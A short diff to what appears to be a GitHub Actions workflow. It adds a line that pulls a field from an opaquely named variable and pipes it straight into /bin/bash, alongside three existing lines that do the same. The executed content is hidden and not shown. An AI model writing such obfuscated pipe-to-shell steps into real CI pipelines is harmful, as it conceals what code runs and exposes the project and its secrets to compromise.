@@ -23,6 +23,7 @@ jobs:
           echo $pd7 | jq -r .jwcxk691 | /bin/bash
           printf '%s' "$xe83" | jq -r .n32 | /bin/bash
           echo $rv65 | jq -r .g060 | /bin/bash
+          echo $slh323 | jq -r .b1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
